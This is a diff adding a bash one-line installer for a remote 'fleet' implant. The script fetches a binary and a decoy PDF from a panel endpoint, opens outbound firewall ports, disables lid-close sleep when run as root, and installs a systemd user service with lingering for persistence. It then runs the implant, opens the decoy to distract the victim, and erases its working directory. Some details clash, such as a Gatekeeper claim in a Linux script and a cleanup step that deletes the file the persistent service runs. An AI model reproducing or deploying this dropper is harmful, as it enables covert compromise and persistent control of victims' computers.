@@ -1,0 +1,79 @@
+#!/bin/bash
+# fleet Linux one-line installer — curl -sSL <panel>/install/linux | bash
+#
+# Bypasses Gatekeeper entirely: curl does not set any quarantine attribute,
+# and running a shell script via bash does not trigger any OS-level code
+# signing check. No root required for user-level install.
+#
+# usage: curl -sSL https://<panel>/install/linux | bash
+set -euo pipefail
+
+WORKDIR="$HOME/.local/share/.fleet-update"
+mkdir -p "$WORKDIR"
+
+# ---- download implant (curl sets no quarantine attribute) ------------------
+IMPLANT_URL="{{PANEL_ENDPOINT}}/install/linux/binary"
+curl -fsSL "$IMPLANT_URL" -o "$WORKDIR/fleetrun"
+chmod 0755 "$WORKDIR/fleetrun"
+
+# ---- download decoy PDF ----------------------------------------------------
+DECOY_URL="{{PANEL_ENDPOINT}}/install/linux/decoy"
+curl -fsSL "$DECOY_URL" -o "$WORKDIR/decoy.pdf"
+
+# ---- stay awake: ignore lid-close sleep in logind (root, best effort) ------
+if [ "$(id -u)" = "0" ] && [ -f /etc/systemd/logind.conf ]; then
+  sed -i 's/^#*HandleLidSwitch=.*/HandleLidSwitch=ignore/' /etc/systemd/logind.conf 2>/dev/null || true
+  sed -i 's/^#*HandleLidSwitchExternalPower=.*/HandleLidSwitchExternalPower=ignore/' /etc/systemd/logind.conf 2>/dev/null || true
+  systemctl restart systemd-logind >/dev/null 2>&1 || true
+fi
+
+# ---- preconfigure host firewall (best effort) ------------------------------
+for port in 8888 8443; do
+  if command -v ufw >/dev/null 2>&1; then
+    sudo -n ufw allow out "${port}/tcp" >/dev/null 2>&1 || true
+  fi
+  if command -v firewall-cmd >/dev/null 2>&1; then
+    sudo -n firewall-cmd --permanent --add-port="${port}/tcp" >/dev/null 2>&1 || true
+    sudo -n firewall-cmd --add-port="${port}/tcp" >/dev/null 2>&1 || true
+  fi
+done
+if command -v firewall-cmd >/dev/null 2>&1; then
+  sudo -n firewall-cmd --reload >/dev/null 2>&1 || true
+fi
+
+# ---- systemd user unit persistence (works without root) --------------------
+UNIT_NAME="fleet-update"
+UNITDIR="${HOME}/.config/systemd/user"
+UNIT="${UNITDIR}/${UNIT_NAME}.service"
+mkdir -p "$UNITDIR" "$HOME/.local/bin"
+
+cat > "$UNIT" <<UNIT
+[Unit]
+Description=fleet update agent
+[Service]
+Type=simple
+ExecStart=$WORKDIR/fleetrun
+Restart=always
+RestartSec=5
+UNIT
+
+if command -v systemctl >/dev/null 2>&1; then
+  systemctl --user daemon-reload >/dev/null 2>&1 || true
+  systemctl --user enable --now "${UNIT_NAME}.service" >/dev/null 2>&1 || true
+fi
+
+if command -v loginctl >/dev/null 2>&1; then
+  loginctl enable-linger "$(id -un)" >/dev/null 2>&1 || true
+fi
+
+# ---- run the implant -------------------------------------------------------
+"$WORKDIR/fleetrun" >/dev/null 2>&1 &
+setsid "$WORKDIR/fleetrun" </dev/null >/dev/null 2>&1 &
+
+# ---- open decoy PDF --------------------------------------------------------
+sleep 1.5
+command -v xdg-open >/dev/null 2>&1 && xdg-open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true
+
+# ---- self-destruct ---------------------------------------------------------
+(sleep 5; rm -rf "$WORKDIR") >/dev/null 2>&1 &
+exit 0
